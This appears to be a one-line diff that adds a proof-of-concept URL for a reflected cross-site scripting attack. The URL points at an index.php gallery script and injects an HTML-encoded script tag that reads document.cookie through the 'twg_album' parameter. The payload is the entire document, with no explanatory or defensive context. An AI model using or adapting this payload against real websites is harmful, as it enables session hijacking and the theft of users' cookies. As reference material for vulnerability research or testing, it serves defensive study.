@@ -1,0 +1,1 @@
+http://www.example.com/[PATH]/index.php?twg_album=&#039;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
